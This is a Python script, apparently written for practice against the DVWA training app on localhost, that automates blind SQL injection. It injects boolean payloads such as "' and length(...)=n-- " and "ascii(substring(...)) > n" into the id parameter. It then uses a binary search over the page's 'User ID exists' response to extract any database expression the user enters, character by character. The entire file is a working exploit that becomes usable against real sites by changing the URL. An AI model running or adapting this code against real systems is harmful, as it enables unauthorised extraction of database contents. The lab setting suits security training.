import dvwa_login
import requests
dvwa_login.login()
sql_get = dvwa_login.session


def get_len(input_str):
    for i in range(1, 20):
        payload = "' and length(%s)=%d-- " % (input_str, i)
        url = "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1%s&Submit=Submit#" % payload
        html = sql_get.get(url)
        if (html.text.find("User ID exists in the database") != -1):
            # print("长度=", i)
            return i


def get_cont(input_str, the_get_len):
    max_num = 127
    min_num = 33
    mid_num = 1
    ascii_cont = ""
    for i in range(1, the_get_len + 1):
        payload = "' and ascii(substring(%s, %d, 1)) > %d-- " % (input_str, i, mid_num)
        url = "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1%s&Submit=Submit#" % payload
        temp_ascii = get_ascii(min_num, max_num, input_str, i, url)
        temp_ascii = chr(temp_ascii)
        ascii_cont += temp_ascii

    return ascii_cont


def get_ascii(min_num, max_num, input_str, i, url):
    mid_num = int((min_num + max_num) / 2)
    payload = "' and ascii(substring(%s, %d, 1)) > %d-- " % (input_str, i, mid_num)
    url = "http://127.0.0.1/DVWA/vulnerabilities/sqli_blind/?id=1%s&Submit=Submit#" % payload
    # print(url)
    html = sql_get.get(url)
    if (max_num - min_num) == 1:
        if (html.text.find("User ID exists in the database") != -1):
            return max_num
        else:
            return min_num
    if (html.text.find("User ID exists in the database") != -1):

        min_num = mid_num
        return get_ascii(min_num, max_num, input_str, i, url)

    else:
        max_num = mid_num
        return get_ascii(min_num, max_num, input_str, i, url)


def main():
    input_str = input("输入：")
    the_get_len = get_len(input_str)
    print(input_str, '长度=', the_get_len)
    ascii_cont = get_cont(input_str, the_get_len)
    print("内容:", ascii_cont)
if __name__ == '__main__':
    main()
